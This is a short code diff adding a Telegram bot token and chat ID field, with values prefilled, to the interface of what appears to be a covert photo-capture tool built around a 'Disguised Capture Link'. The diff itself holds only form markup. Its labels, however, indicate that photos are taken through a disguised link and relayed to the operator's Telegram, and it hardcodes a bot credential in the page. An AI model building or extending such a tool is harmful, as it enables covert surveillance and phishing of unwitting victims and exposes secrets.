@@ -283,6 +283,18 @@
                         </button>
                     </div>
                 </div>
+
+                <!-- Telegram Integration -->
+                <div class="field-group tg-config">
+                    <label><i class="fa-brands fa-telegram"></i> Telegram Integration (Optional)</label>
+                    <div class="tg-inputs">
+                        <input type="text" id="tgToken" placeholder="Bot Token (e.g. 12345:ABC...)"
+                            value="8213017865:AAFEQX-_mK53lfmQdLvFL4KSUND2Tr8PykM" onchange="saveTgSettings()">
+                        <input type="text" id="tgChat" placeholder="Chat ID (e.g. 98765432)" value="6731689359"
+                            onchange="saveTgSettings()">
+                    </div>
+                    <small class="tg-help">Get instant photos sent to your Telegram phone!</small>
+                </div>
                 <div class="field-group">
                     <label>Your Disguised Capture Link</label>
                     <div class="link-box" id="linkBox">
